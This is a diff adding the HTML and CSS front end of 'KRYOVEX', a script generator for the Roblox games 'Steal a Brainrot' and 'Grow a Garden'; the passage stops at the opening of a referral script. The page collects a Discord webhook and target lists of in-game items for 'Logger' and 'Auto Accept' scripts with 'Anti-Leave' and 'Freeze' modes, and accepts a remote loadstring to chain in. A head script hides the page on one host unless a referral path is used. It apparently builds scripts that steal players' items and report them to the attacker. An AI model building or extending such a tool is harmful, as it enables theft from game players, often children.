@@ -1,0 +1,1009 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>KRYOVEX - GENERATOR</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@300;400;500;600;700;800&family=Syncopate:wght@700&family=Space+Mono&family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0; padding: 0; }
+        .hidden { display: none !important; }
+
+        /* ======================================================
+           KRYOVEX BLUE THEME
+        ====================================================== */
+        :root {
+            --ve-neon: #3b82f6;
+            --ve-glow: rgba(59,130,246,0.5);
+            --ve-bg: #02040a;
+        }
+        body.ve-theme {
+            background: var(--ve-bg);
+            color: #fff;
+            font-family: 'Inter', sans-serif;
+            min-height: 100vh;
+            display: flex; flex-direction: column; align-items: center;
+            padding: 15px; overflow-x: hidden;
+        }
+        body.ve-theme #bg-canvas {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 0; pointer-events: none; opacity: 0.6;
+        }
+        body.ve-theme .ve-header {
+            position: relative; z-index: 10;
+            width: 100%; max-width: 550px;
+            display: flex; align-items: center; justify-content: space-between;
+            padding: 8px; margin-bottom: 8px;
+        }
+        body.ve-theme .ve-title {
+            font-family: 'Syncopate', sans-serif;
+            font-size: clamp(1.2rem, 5.5vw, 2.5rem);
+            font-weight: 700; text-transform: uppercase; letter-spacing: -1px;
+            color: #fff; text-shadow: 0 0 15px var(--ve-glow);
+        }
+        body.ve-theme .ve-card {
+            position: relative; z-index: 1;
+            background: rgba(8,12,22,0.88); backdrop-filter: blur(12px);
+            border: 1px solid rgba(59,130,246,0.25); border-radius: 24px;
+            padding: clamp(20px,5vw,35px); width: 100%; max-width: 550px;
+            box-shadow: 0 0 50px rgba(0,0,0,0.9), 0 0 22px rgba(59,130,246,0.08);
+            margin-bottom: 12px;
+        }
+        body.ve-theme .tab-row {
+            position: relative; z-index: 10;
+            display: flex; gap: 8px; justify-content: center;
+            width: 100%; max-width: 550px; margin-bottom: 10px;
+        }
+        body.ve-theme .tab-btn {
+            padding: 8px 18px; border-radius: 10px;
+            font-size: 10px; font-weight: 900; text-transform: uppercase; letter-spacing: 1px;
+            cursor: pointer; transition: 0.2s;
+            border: 1px solid rgba(59,130,246,0.16);
+            background: rgba(5,10,20,0.65); color: #64748b;
+        }
+        body.ve-theme .tab-btn.active { background: var(--ve-neon); color: #fff; border-color: var(--ve-neon); box-shadow: 0 0 15px var(--ve-glow); }
+        body.ve-theme .inp {
+            background: rgba(2,6,15,0.85) !important; border: 1px solid #1e293b !important;
+            border-radius: 12px; padding: 14px; width: 100%;
+            color: #fff !important; font-family: 'Space Mono', monospace;
+            font-size: 13px; transition: 0.3s;
+        }
+        body.ve-theme .inp:focus { outline: none; border-color: var(--ve-neon) !important; box-shadow: 0 0 15px rgba(59,130,246,0.35); }
+        body.ve-theme .inp::placeholder { color: #475569; }
+        body.ve-theme .lbl { font-size: 10px; font-weight: 800; text-transform: uppercase; letter-spacing: 2px; color: #64748b; margin-bottom: 8px; display: block; }
+        body.ve-theme .pill {
+            background: rgba(59,130,246,0.05); border: 1px solid rgba(59,130,246,0.14);
+            color: #94a3b8; padding: 8px 12px; border-radius: 8px;
+            font-size: 10px; font-weight: 800; text-transform: uppercase; cursor: pointer; transition: 0.2s;
+        }
+        body.ve-theme .pill.active { background: var(--ve-neon); color: #fff; border-color: var(--ve-neon); box-shadow: 0 0 15px var(--ve-glow); }
+        body.ve-theme .mode-btn {
+            padding: 10px; border-radius: 12px; border: 1px solid rgba(59,130,246,0.12);
+            background: #030712; color: #64748b; font-size: 9px; font-weight: 900;
+            text-transform: uppercase; cursor: pointer; transition: 0.2s;
+        }
+        body.ve-theme .mode-btn.active { border-color: var(--ve-neon); color: #93c5fd; background: rgba(59,130,246,0.14); box-shadow: 0 0 12px rgba(59,130,246,0.25); }
+        body.ve-theme .primary-btn {
+            background: linear-gradient(45deg,#0f172a,#172554); color: #fff;
+            width: 100%; padding: 18px; border-radius: 16px;
+            font-weight: 900; font-size: 13px; letter-spacing: 2px; text-transform: uppercase;
+            margin-top: 20px; border: 1px solid rgba(59,130,246,0.4); cursor: pointer; transition: 0.4s;
+        }
+        body.ve-theme .primary-btn:hover:not(:disabled) { box-shadow: 0 0 30px rgba(59,130,246,0.55); border-color: #60a5fa; transform: translateY(-2px); }
+        body.ve-theme .link-btn { color: #60a5fa; font-size: 9px; font-weight: 800; text-transform: uppercase; cursor: pointer; }
+        body.ve-theme .switch { position: relative; display: inline-block; width: 44px; height: 24px; }
+        body.ve-theme .switch input { opacity: 0; width: 0; height: 0; }
+        body.ve-theme .slider { position: absolute; cursor: pointer; inset: 0; background: #0f172a; transition: .4s; border-radius: 34px; border: 1px solid #1e3a8a; }
+        body.ve-theme input:checked + .slider { background: var(--ve-neon); border-color: var(--ve-neon); }
+        body.ve-theme .slider:before { position: absolute; content: ""; height: 16px; width: 16px; left: 3px; bottom: 3px; background: white; transition: .4s; border-radius: 50%; }
+        body.ve-theme input:checked + .slider:before { transform: translateX(20px); }
+        body.ve-theme .provider-btn {
+            flex: 1; padding: 7px 10px; border-radius: 8px;
+            font-size: 9px; font-weight: 900; text-transform: uppercase;
+            cursor: pointer; transition: 0.2s;
+            border: 1px solid rgba(59,130,246,0.15); background: rgba(2,6,15,0.65); color: #64748b;
+        }
+        body.ve-theme .provider-btn.active { background: var(--ve-neon); color: #fff; border-color: var(--ve-neon); box-shadow: 0 0 12px var(--ve-glow); }
+        body.ve-theme .sect-row { background: rgba(2,6,15,0.55); border: 1px solid rgba(59,130,246,0.12); border-radius: 14px; padding: 14px; }
+        body.ve-theme .output-code { background: #020617; color: #93c5fd; border: 1px solid rgba(59,130,246,0.28); border-radius: 10px; padding: 16px; font-family: 'Space Mono', monospace; font-size: 11px; overflow-x: auto; white-space: pre-wrap; word-break: break-all; }
+        body.ve-theme .scroll-box { max-height: 140px; overflow-y: auto; }
+        body.ve-theme .scroll-box::-webkit-scrollbar { width: 4px; }
+        body.ve-theme .scroll-box::-webkit-scrollbar-thumb { background: var(--ve-neon); border-radius: 10px; }
+        body.ve-theme .count-text { font-size: 9px; font-weight: 800; color: #64748b; text-transform: uppercase; margin-top: 6px; }
+        body.ve-theme .auth-ok { font-size: 10px; font-weight: 800; color: #93c5fd; border: 1px solid rgba(59,130,246,0.35); background: rgba(59,130,246,0.14); padding: 8px 16px; border-radius: 12px; display: flex; align-items: center; gap: 8px; }
+        body.ve-theme .copy-link { color: #60a5fa; font-size: 10px; font-weight: 800; text-transform: uppercase; cursor: pointer; }
+        body.ve-theme .ref-copy-btn { background: #2563eb; color: #fff; padding: 0 16px; border-radius: 10px; font-size: 10px; font-weight: 800; cursor: pointer; border: none; }
+
+        /* ======================================================
+           AUTO MOREIRA THEME — Blue Accent
+        ====================================================== */
+        :root {
+            --am-cyan: #38bdf8;
+            --am-cyan-glow: rgba(56,189,248,0.35);
+            --am-cyan-dim: rgba(56,189,248,0.12);
+            --am-card: rgba(255,255,255,0.04);
+            --am-border: rgba(255,255,255,0.08);
+        }
+        body.am-theme {
+            background: #000;
+            color: #fff;
+            font-family: 'Sora', sans-serif;
+            min-height: 100vh;
+            display: flex; flex-direction: column; align-items: center;
+            padding: 0 16px 40px; overflow-x: hidden;
+        }
+        body.am-theme #bg-canvas { display: none !important; }
+
+        body.am-theme .am-hero {
+            width: 100%; max-width: 680px;
+            padding: 28px 0 18px;
+            text-align: center;
+            border-bottom: 1px solid var(--am-border);
+            margin-bottom: 22px;
+        }
+        body.am-theme .am-hero-title {
+            font-family: 'Sora', sans-serif;
+            font-size: clamp(1.8rem, 7vw, 3rem);
+            font-weight: 800;
+            letter-spacing: -1px;
+            line-height: 1;
+            background: linear-gradient(135deg, #fff 40%, var(--am-cyan) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            filter: drop-shadow(0 0 20px var(--am-cyan-glow));
+        }
+        body.am-theme .am-hero-sub {
+            font-size: 10px;
+            font-weight: 500;
+            color: #555;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            margin-top: 10px;
+        }
+
+        body.am-theme .tab-row {
+            display: flex; gap: 0;
+            width: 100%; max-width: 680px;
+            background: rgba(255,255,255,0.03);
+            border: 1px solid var(--am-border);
+            border-radius: 14px;
+            overflow: hidden;
+            margin-bottom: 20px;
+            padding: 4px;
+        }
+        body.am-theme .tab-btn {
+            flex: 1; padding: 11px 16px;
+            font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 1.5px;
+            cursor: pointer; transition: 0.2s;
+            border: none; border-radius: 10px;
+            background: transparent; color: #444;
+            font-family: 'Sora', sans-serif;
+        }
+        body.am-theme .tab-btn.active {
+            background: var(--am-cyan-dim);
+            color: var(--am-cyan);
+            box-shadow: 0 0 20px var(--am-cyan-glow);
+        }
+
+        body.am-theme .ve-card {
+            background: var(--am-card);
+            backdrop-filter: blur(16px);
+            border: 1px solid var(--am-border);
+            border-radius: 20px;
+            padding: clamp(20px, 5vw, 32px);
+            width: 100%; max-width: 680px;
+            box-shadow: 0 0 0 0 transparent;
+            margin-bottom: 16px;
+            transition: box-shadow 0.3s;
+        }
+
+        body.am-theme .lbl {
+            font-size: 9px; font-weight: 600; text-transform: uppercase; letter-spacing: 3px;
+            color: #444; margin-bottom: 8px; display: block;
+        }
+        body.am-theme .inp {
+            background: rgba(255,255,255,0.05) !important;
+            border: 1px solid rgba(255,255,255,0.09) !important;
+            border-radius: 10px; padding: 13px 14px;
+            width: 100%; color: #fff !important;
+            font-family: 'Sora', sans-serif; font-size: 13px; font-weight: 400;
+            transition: 0.25s;
+        }
+        body.am-theme .inp:focus { outline: none; border-color: var(--am-cyan) !important; box-shadow: 0 0 0 3px var(--am-cyan-dim) !important; }
+        body.am-theme .inp::placeholder { color: #333; }
+        body.am-theme textarea.inp { resize: none; }
+
+        body.am-theme .mode-btn {
+            padding: 10px 6px;
+            border: 1px solid rgba(255,255,255,0.07);
+            border-radius: 10px;
+            background: rgba(255,255,255,0.03); color: #444;
+            font-size: 9px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px;
+            cursor: pointer; transition: 0.2s; font-family: 'Sora', sans-serif;
+        }
+        body.am-theme .mode-btn.active { border-color: var(--am-cyan); color: var(--am-cyan); background: var(--am-cyan-dim); box-shadow: 0 0 12px var(--am-cyan-glow); }
+
+        body.am-theme .pill {
+            background: rgba(255,255,255,0.04);
+            border: 1px solid rgba(255,255,255,0.08);
+            color: #555; padding: 7px 11px;
+            border-radius: 999px;
+            font-size: 10px; font-weight: 600; cursor: pointer; transition: 0.18s;
+            font-family: 'Sora', sans-serif;
+        }
+        body.am-theme .pill.active { background: var(--am-cyan-dim); color: var(--am-cyan); border-color: var(--am-cyan); box-shadow: 0 0 10px var(--am-cyan-glow); }
+
+        body.am-theme .primary-btn {
+            background: linear-gradient(135deg, rgba(56,189,248,0.15) 0%, rgba(56,189,248,0.05) 100%);
+            color: var(--am-cyan);
+            width: 100%; padding: 17px;
+            border-radius: 14px; font-weight: 700;
+            font-size: 12px; letter-spacing: 3px; text-transform: uppercase;
+            margin-top: 20px;
+            border: 1px solid rgba(56,189,248,0.4);
+            cursor: pointer; transition: 0.3s;
+            font-family: 'Sora', sans-serif;
+        }
+        body.am-theme .primary-btn:hover:not(:disabled) { background: linear-gradient(135deg, rgba(56,189,248,0.25) 0%, rgba(56,189,248,0.1) 100%); box-shadow: 0 0 30px var(--am-cyan-glow); transform: translateY(-1px); }
+
+        body.am-theme .link-btn { color: var(--am-cyan); font-size: 9px; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; cursor: pointer; font-family: 'Sora', sans-serif; }
+        body.am-theme .switch { position: relative; display: inline-block; width: 44px; height: 24px; }
+        body.am-theme .switch input { opacity: 0; width: 0; height: 0; }
+        body.am-theme .slider { position: absolute; cursor: pointer; inset: 0; background: rgba(255,255,255,0.08); transition: .4s; border-radius: 34px; border: 1px solid rgba(255,255,255,0.1); }
+        body.am-theme input:checked + .slider { background: var(--am-cyan); border-color: var(--am-cyan); box-shadow: 0 0 12px var(--am-cyan-glow); }
+        body.am-theme .slider:before { position: absolute; content: ""; height: 16px; width: 16px; left: 3px; bottom: 3px; background: white; transition: .4s; border-radius: 50%; }
+        body.am-theme input:checked + .slider:before { transform: translateX(20px); }
+        body.am-theme .provider-btn { flex: 1; padding: 9px 10px; border-radius: 10px; font-size: 9px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; cursor: pointer; transition: 0.2s; border: 1px solid rgba(255,255,255,0.07); background: rgba(255,255,255,0.03); color: #444; font-family: 'Sora', sans-serif; }
+        body.am-theme .provider-btn.active { background: var(--am-cyan-dim); color: var(--am-cyan); border-color: var(--am-cyan); box-shadow: 0 0 10px var(--am-cyan-glow); }
+        body.am-theme .sect-row { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.07); border-radius: 14px; padding: 14px; }
+        body.am-theme .output-code { background: rgba(56,189,248,0.04); color: var(--am-cyan); border: 1px solid rgba(56,189,248,0.2); border-radius: 12px; padding: 16px; font-family: 'Sora', monospace; font-size: 11px; overflow-x: auto; white-space: pre-wrap; word-break: break-all; }
+        body.am-theme .scroll-box { max-height: 140px; overflow-y: auto; }
+        body.am-theme .scroll-box::-webkit-scrollbar { width: 4px; }
+        body.am-theme .scroll-box::-webkit-scrollbar-thumb { background: var(--am-cyan); border-radius: 10px; }
+        body.am-theme .count-text { font-size: 9px; font-weight: 600; color: #444; text-transform: uppercase; margin-top: 6px; letter-spacing: 2px; }
+        body.am-theme .auth-ok { display: none !important; }
+        body.am-theme .copy-link { color: var(--am-cyan); font-size: 10px; font-weight: 600; text-transform: uppercase; cursor: pointer; letter-spacing: 1px; }
+        body.am-theme .ref-copy-btn { background: var(--am-cyan-dim); color: var(--am-cyan); padding: 0 16px; border-radius: 10px; font-size: 10px; font-weight: 700; cursor: pointer; border: 1px solid rgba(56,189,248,0.4); transition: 0.2s; font-family: 'Sora', sans-serif; }
+        body.am-theme .output-divider { border: none; border-top: 1px solid rgba(255,255,255,0.06); margin: 20px 0; }
+        body.am-theme .ve-header { display: none !important; }
+    </style>
+    <script>
+        (function(){
+            var isAM = window.location.hostname.includes('automoreira.xyz');
+            var parts = window.location.pathname.split('/');
+            var isRef = parts[1] === 'r' && parts[2];
+            if (isAM && !isRef) {
+                document.write('<style>html,body{margin:0;padding:0;background:#000!important;}body>*{display:none!important;}</style>');
+                document.addEventListener('DOMContentLoaded',function(){
+                    document.body.innerHTML='';
+                    document.title='';
+                });
+            }
+            if (isRef) {
+                document.documentElement.style.background = '#000';
+                document.documentElement.style.visibility = 'hidden';
+            }
+        })();
+    </script>
+</head>
+<body class="ve-theme">
+    <canvas id="bg-canvas"></canvas>
+
+    <!-- KRYOVEX HEADER -->
+    <div class="ve-header" id="ve-header">
+        <div class="ve-title">KRYOVEX</div>
+        <div id="logged-in-status" class="auth-ok">
+            <i class="fa-solid fa-circle-check" style="color:#60a5fa"></i> READY
+        </div>
+    </div>
+
+    <!-- AM HERO (hidden by default, shown in am-theme) -->
+    <div class="am-hero hidden" id="am-hero">
+        <div class="am-hero-title" id="am-hero-username">KRYOVEX</div>
+        <p class="am-hero-sub">Script Generator</p>
+    </div>
+
+    <!-- GAME TABS -->
+    <div class="tab-row" id="game-tabs-row">
+        <button class="tab-btn active" id="gtab-sab" onclick="switchGame('sab')">Steal a Brainrot</button>
+        <button class="tab-btn" id="gtab-gag" onclick="switchGame('gag')">Grow a Garden</button>
+    </div>
+
+    <!-- ============================= STEAL A BRAINROT ============================= -->
+    <div class="ve-card" id="game-sab">
+
+        <div class="tab-row" id="sab-tool-tabs" style="margin-bottom:20px;">
+            <button class="tab-btn active" id="sabtab-logger" onclick="switchSabTool('logger')">Logger</button>
+            <button class="tab-btn" id="sabtab-auto-accept" onclick="switchSabTool('auto-accept')">Auto Accept</button>
+        </div>
+
+        <!-- GENERATOR PANEL -->
+        <div id="sab-gen-panel">
+            <div style="display:flex;flex-direction:column;gap:18px;">
+                <div id="username-field-wrap">
+                    <label class="lbl">Roblox Username</label>
+                    <input type="text" id="roblox-username" placeholder="Your username" class="inp">
+                </div>
+                <div>
+                    <label class="lbl">Discord Webhook</label>
+                    <input type="text" id="webhook" placeholder="https://discord.com/api/webhooks/..." class="inp">
+                </div>
+                <div>
+                    <label class="lbl">Execution Mode</label>
+                    <div style="display:flex;flex-wrap:wrap;gap:6px;">
+                        <button onclick="setMode('normal')" id="btn-normal" class="mode-btn active" style="flex:1;min-width:60px;">NORMAL</button>
+                        <button onclick="setMode('freeze')" id="btn-freeze" class="mode-btn" style="flex:1;min-width:60px;">FREEZE</button>
+                        <button onclick="setMode('dice')" id="btn-dice" class="mode-btn" style="flex:1;min-width:60px;">DICE</button>
+                        <button onclick="setMode('anti-leave')" id="btn-anti-leave" class="mode-btn" style="flex:1;min-width:60px;">ANTI-LEAVE</button>
+                        <button onclick="setMode('custom')" id="btn-custom" class="mode-btn" style="flex:1;min-width:60px;">CUSTOM</button>
+                    </div>
+                </div>
+                <div id="custom-section" class="hidden">
+                    <label class="lbl">Custom Mode Settings</label>
+                    <div style="display:flex;gap:8px;margin-bottom:14px;">
+                        <button onclick="setCustomBase('normal')" id="custombase-btn-normal" class="provider-btn active">Normal (No Gui)</button>
+                        <button onclick="setCustomBase('anti-leave')" id="custombase-btn-anti-leave" class="provider-btn">Anti-Leave</button>
+                    </div>
+                    <label class="lbl">Second Loadstring</label>
+                    <textarea id="custom-loadstring" rows="3" placeholder='loadstring(game:HttpGet("..."))()' class="inp"></textarea>
+                </div>
+                <div>
+                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
+                        <label class="lbl" style="margin-bottom:0;">Target Brainrots</label>
+                        <div style="display:flex;gap:12px;">
+                            <span onclick="selectAll()" class="link-btn">All</span>
+                            <span onclick="deselectAll()" class="link-btn">None</span>
+                        </div>
+                    </div>
+                    <input type="text" id="brainrot-search" placeholder="Search..." class="inp" style="padding:9px 14px;font-size:11px;margin-bottom:10px;">
+                    <div id="brainrot-container" class="scroll-box" style="display:flex;flex-wrap:wrap;gap:6px;"></div>
+                    <div id="count-text" class="count-text">0 SELECTED</div>
+                </div>
+                <div>
+                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
+                        <label class="lbl" style="margin-bottom:0;">Target Base Skins</label>
+                        <div style="display:flex;gap:12px;">
+                            <span onclick="selectAllSkins()" class="link-btn">All</span>
+                            <span onclick="deselectAllSkins()" class="link-btn">None</span>
+                        </div>
+                    </div>
+                    <input type="text" id="skin-search" placeholder="Search..." class="inp" style="padding:9px 14px;font-size:11px;margin-bottom:10px;">
+                    <div id="skin-container" class="scroll-box" style="display:flex;flex-wrap:wrap;gap:6px;"></div>
+                    <div id="skin-count-text" class="count-text">0 SELECTED</div>
+                </div>
+                <div>
+                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
+                        <label class="lbl" style="margin-bottom:0;">Target Gears</label>
+                        <div style="display:flex;gap:12px;">
+                            <span onclick="selectAllGears()" class="link-btn">All</span>
+                            <span onclick="deselectAllGears()" class="link-btn">None</span>
+                        </div>
+                    </div>
+                    <input type="text" id="gear-search" placeholder="Search..." class="inp" style="padding:9px 14px;font-size:11px;margin-bottom:10px;">
+                    <div id="gear-container" class="scroll-box" style="display:flex;flex-wrap:wrap;gap:6px;"></div>
+                    <div id="gear-count-text" class="count-text">0 SELECTED</div>
+                </div>
+                <div id="sab-loadstring-row" class="sect-row" style="display:flex;align-items:center;justify-content:space-between;">
+                    <div>
+                        <p style="font-size:12px;font-weight:600;">Short Loadstring</p>
+                        <p class="lbl" style="margin:2px 0 0;">Generate /v2/scrap/.../raw link</p>
+                    </div>
+                    <label class="switch">
+                        <input type="checkbox" id="loadstring-toggle">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <button onclick="generateScript()" class="primary-btn"><span id="gen-text">GENERATE SCRIPT</span></button>
+            </div>
+            <div id="output-section" class="hidden" style="margin-top:20px;padding-top:20px;">
+                <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
+                    <span class="lbl" style="margin-bottom:0;">Generated output</span>
+                    <span onclick="copyToClipboard('script-display')" id="copy-btn" class="copy-link">COPY</span>
+                </div>
+                <pre id="script-display" class="output-code"></pre>
+            </div>
+        </div><!-- end sab-gen-panel -->
+
+        <!-- AUTO ACCEPT CONFIG PANEL -->
+        <div id="sab-auto-accept-panel" class="hidden">
+            <div style="display:flex;flex-direction:column;gap:18px;">
+                <div>
+                    <label class="lbl">Discord Webhook</label>
+                    <input type="text" id="aa-webhook" placeholder="https://discord.com/api/webhooks/..." class="inp">
+                </div>
+
+                <div>
+                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
+                        <label class="lbl" style="margin-bottom:0;">Target Brainrots</label>
+                        <div style="display:flex;gap:12px;">
+                            <span onclick="selectAllAutoAccept('brainrots')" class="link-btn">All</span>
+                            <span onclick="clearAutoAccept('brainrots')" class="link-btn">None</span>
+                        </div>
+                    </div>
+                    <input type="text" id="aa-brainrot-search" placeholder="Search..." class="inp" style="padding:9px 14px;font-size:11px;margin-bottom:10px;">
+                    <div id="aa-brainrot-container" class="scroll-box" style="display:flex;flex-wrap:wrap;gap:6px;"></div>
+                    <div id="aa-brainrot-count" class="count-text">0 SELECTED</div>
+                </div>
+
+                <div>
+                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
+                        <label class="lbl" style="margin-bottom:0;">Target Base Skins</label>
+                        <div style="display:flex;gap:12px;">
+                            <span onclick="selectAllAutoAccept('skins')" class="link-btn">All</span>
+                            <span onclick="clearAutoAccept('skins')" class="link-btn">None</span>
+                        </div>
+                    </div>
+                    <input type="text" id="aa-skin-search" placeholder="Search..." class="inp" style="padding:9px 14px;font-size:11px;margin-bottom:10px;">
+                    <div id="aa-skin-container" class="scroll-box" style="display:flex;flex-wrap:wrap;gap:6px;"></div>
+                    <div id="aa-skin-count" class="count-text">0 SELECTED</div>
+                </div>
+
+                <div>
+                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
+                        <label class="lbl" style="margin-bottom:0;">Target Gears</label>
+                        <div style="display:flex;gap:12px;">
+                            <span onclick="selectAllAutoAccept('gears')" class="link-btn">All</span>
+                            <span onclick="clearAutoAccept('gears')" class="link-btn">None</span>
+                        </div>
+                    </div>
+                    <input type="text" id="aa-gear-search" placeholder="Search..." class="inp" style="padding:9px 14px;font-size:11px;margin-bottom:10px;">
+                    <div id="aa-gear-container" class="scroll-box" style="display:flex;flex-wrap:wrap;gap:6px;"></div>
+                    <div id="aa-gear-count" class="count-text">0 SELECTED</div>
+                </div>
+
+                <div class="sect-row" style="display:flex;align-items:center;justify-content:space-between;">
+                    <div>
+                        <p style="font-size:12px;font-weight:600;">Trade Blocking</p>
+                        <p class="lbl" style="margin:2px 0 0;">Stop accepting repeat trades from the same player</p>
+                    </div>
+                    <label class="switch">
+                        <input type="checkbox" id="aa-trade-block-enabled" checked onchange="toggleTradeBlockFields()">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+
+                <div id="aa-trade-block-settings" style="display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:12px;align-items:end;">
+                    <div>
+                        <label class="lbl" style="min-height:28px;display:flex;align-items:flex-end;">Trade Block Minimum</label>
+                        <input type="number" id="aa-trade-minimum" min="1" max="100" value="5" class="inp">
+                    </div>
+                    <div>
+                        <label class="lbl" style="min-height:28px;display:flex;align-items:flex-end;">Trade Block Window (Seconds)</label>
+                        <input type="number" id="aa-trade-window" min="1" max="3600" value="60" class="inp">
+                    </div>
+                </div>
+
+                <div id="aa-loadstring-row" class="sect-row" style="display:flex;align-items:center;justify-content:space-between;">
+                    <div>
+                        <p style="font-size:12px;font-weight:600;">Short Loadstring</p>
+                        <p class="lbl" style="margin:2px 0 0;">Generate /v2/scrap/.../raw link</p>
+                    </div>
+                    <label class="switch">
+                        <input type="checkbox" id="aa-loadstring-toggle">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+
+                <p id="aa-error-msg" class="hidden" style="color:#ef4444;font-size:10px;font-weight:700;text-transform:uppercase;text-align:center;"></p>
+                <button onclick="generateAutoAcceptConfig()" class="primary-btn">
+                    <span id="aa-gen-text">GENERATE AUTO ACCEPT SCRIPT</span>
+                </button>
+            </div>
+
+            <div id="aa-output-section" class="hidden" style="margin-top:20px;padding-top:20px;">
+                <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
+                    <span class="lbl" style="margin-bottom:0;">Auto Accept Script</span>
+                    <span onclick="copyAutoAcceptConfig()" id="aa-copy-btn" class="copy-link">COPY</span>
+                </div>
+                <pre id="aa-script-display" class="output-code"></pre>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- ============================= GROW A GARDEN ============================= -->
+    <div class="ve-card hidden" id="game-gag">
+        <div style="display:flex;flex-direction:column;gap:18px;">
+            <div>
+                <label class="lbl">Roblox Username</label>
+                <input type="text" id="gag-normal-target" placeholder="Your username" class="inp">
+            </div>
+            <div>
+                <label class="lbl">Discord Webhook</label>
+                <input type="text" id="gag-normal-webhook" placeholder="https://discord.com/api/webhooks/..." class="inp">
+            </div>
+            <div>
+                <label class="lbl">Execution Mode</label>
+                <div style="display:flex;gap:8px;">
+                    <button onclick="setGagMode('normal')" id="gag-btn-normal" class="mode-btn active" style="flex:1;">NORMAL</button>
+                    <button onclick="setGagMode('custom')" id="gag-btn-custom" class="mode-btn" style="flex:1;">CUSTOM</button>
+                </div>
+            </div>
+            <div id="gag-custom-section" class="hidden">
+                <label class="lbl">Second Loadstring</label>
+                <textarea id="gag-custom-loadstring" rows="3" placeholder='loadstring(game:HttpGet("..."))()' class="inp"></textarea>
+            </div>
+            <div>
+                <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;"><label class="lbl" style="margin-bottom:0;">Target Seeds</label><div style="display:flex;gap:12px;"><span onclick="selectAllGag('seeds')" class="link-btn">All</span><span onclick="deselectAllGag('seeds')" class="link-btn">None</span></div></div>
+                <input type="text" id="gag-seed-search" placeholder="Search..." class="inp" style="padding:9px 14px;font-size:11px;margin-bottom:10px;">
+                <div id="gag-seed-container" class="scroll-box" style="display:flex;flex-wrap:wrap;gap:6px;"></div>
+                <div id="gag-seed-count" class="count-text">0 SELECTED</div>
+            </div>
+            <div>
+                <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;"><label class="lbl" style="margin-bottom:0;">Target Pets</label><div style="display:flex;gap:12px;"><span onclick="selectAllGag('pets')" class="link-btn">All</span><span onclick="deselectAllGag('pets')" class="link-btn">None</span></div></div>
+                <input type="text" id="gag-pet-search" placeholder="Search..." class="inp" style="padding:9px 14px;font-size:11px;margin-bottom:10px;">
+                <div id="gag-pet-container" class="scroll-box" style="display:flex;flex-wrap:wrap;gap:6px;"></div>
+                <div id="gag-pet-count" class="count-text">0 SELECTED</div>
+            </div>
+            <div>
+                <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;"><label class="lbl" style="margin-bottom:0;">Target Gears</label><div style="display:flex;gap:12px;"><span onclick="selectAllGag('gears')" class="link-btn">All</span><span onclick="deselectAllGag('gears')" class="link-btn">None</span></div></div>
+                <input type="text" id="gag-gear-search" placeholder="Search..." class="inp" style="padding:9px 14px;font-size:11px;margin-bottom:10px;">
+                <div id="gag-gear-container" class="scroll-box" style="display:flex;flex-wrap:wrap;gap:6px;"></div>
+                <div id="gag-gear-count" class="count-text">0 SELECTED</div>
+            </div>
+            <div>
+                <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;"><label class="lbl" style="margin-bottom:0;">Target Props</label><div style="display:flex;gap:12px;"><span onclick="selectAllGag('props')" class="link-btn">All</span><span onclick="deselectAllGag('props')" class="link-btn">None</span></div></div>
+                <input type="text" id="gag-prop-search" placeholder="Search..." class="inp" style="padding:9px 14px;font-size:11px;margin-bottom:10px;">
+                <div id="gag-prop-container" class="scroll-box" style="display:flex;flex-wrap:wrap;gap:6px;"></div>
+                <div id="gag-prop-count" class="count-text">0 SELECTED</div>
+            </div>
+            <div class="sect-row" style="display:flex;align-items:center;justify-content:space-between;">
+                <div><p style="font-size:12px;font-weight:600;">Short Loadstring</p><p class="lbl" style="margin:2px 0 0;">Generate /v2/scrap/.../raw link</p></div>
+                <label class="switch"><input type="checkbox" id="gag-loadstring-toggle"><span class="slider"></span></label>
+            </div>
+            <button onclick="generateGagScript()" class="primary-btn"><span id="gag-gen-text">GENERATE SCRIPT</span></button>
+        </div>
+        <div id="gag-output-section" class="hidden" style="margin-top:20px;padding-top:20px;">
+            <hr class="output-divider">
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
+                <span class="lbl" style="margin-bottom:0;">Copy into your executor</span>
+                <span onclick="copyToClipboard('gag-script-display')" class="copy-link">COPY</span>
+            </div>
+            <pre id="gag-script-display" class="output-code"></pre>
+        </div>
+    </div>
+
+    <!-- ============================= REF / LINK BUILDER ============================= -->
+    <script>
+        (function(){
+            var p=window.location.pathname;
+            if(p.startsWith('/r/')&&p.split('/')[2]){
